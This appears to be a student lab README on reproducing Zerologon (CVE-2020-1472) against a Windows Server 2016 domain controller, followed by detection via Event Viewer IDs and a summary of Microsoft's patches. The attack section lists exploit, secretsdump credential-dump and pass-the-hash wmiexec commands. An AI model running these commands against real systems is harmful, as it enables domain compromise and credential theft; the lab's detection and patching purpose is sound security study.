# Zerologon_CVE-2020-1472
## Objective
This vulnerability research aimed to establish a controlled environment for simulating a Zerologon on windows Server 2016 through Kali Linux for detection and mtigiation purposes. The primary focus was to perform a vulnerability pentration and show the possiblity of controlling a desktop through not logining in as the user of the desktop while detecting and mitigating the vulnerability.

### Skills Learned
- Advanced understanding of Windows Event Viewers
- Proficiency in Kali Linux and Impackets
- Ability to perform a zerologon

### Tools Used
- <a href="https://github.com/dirkjanm/CVE-2020-1472">Zerologon Codes<a/>
- Windows Server 2016
- Kali Linux

## Steps to implement Zerologon

## Kali Linux
1. sudo su to root user
2. git clone https://github.com/dirkjanm/CVE-2020-1472
3. cd /home/kali/impacket/examples/CVE-2020-1472 (Change directory according to your directory)
5. /cve-2020-1472-exploit.py -n [NETBIOS] -t [IPaddress]
6. secretsdump.py -no-pass -just-dc [NETBIOS/User]\$@[IP adress]
7. wmiexec.py [Domain/User@IP] - hashes [hash]

<img width="1102" alt="Screenshot 2023-03-25 at 10 47 33 AM" src="https://github.com/JolynNgSC/Zerologon_CVE-2020-1472/assets/164031233/eaaf1b73-2619-4018-b5b2-ae4066cfb981">

## Steps to identify Zerologon
## Windows 
**IMPORTANT** Disable security feature
1. Check the Event Viewer
2. Under Server Manager, select Windows Logs, Security and look for Event ID 4624 (User Logon Event)
Signs of a Zerologon
- The subject of the logs will be named NULL SID
- This logon should be given administrative rights as well.
<img width="997" alt="Screenshot 2023-02-13 at 10 11 13 PM" src="https://github.com/JolynNgSC/Zerologon_CVE-2020-1472/assets/164031233/8d0416f1-ab33-4cdb-8542-7ad8dc83ef7b">
- You can also check log 4742 (NT Authority is the Attacker)
<img width="1092" alt="Screenshot 2023-03-30 at 9 52 58 PM" src="https://github.com/JolynNgSC/Zerologon_CVE-2020-1472/assets/164031233/d303feac-2b6c-4321-be77-c1ac6690b75e">

## Steps to Patch
Microsoft has developed available patches to protect Windows Servers (2008, 2016 and 2019); This was how it was planned. In the first phase, when downloading the first patch (August patch), the domain can protect other connected devices from non-compliant devices; there would be an option to protect all joined devices with an explicit exception.

Second patch (February of next year patch), the enforcement phase, when installed, all windows and non-windows devices are forced to use a secure Remote Procedure Call with Netlogon. Or to explicitly allow certain trusted devices. Essentially kicking the non-compliant computer out of the domain.



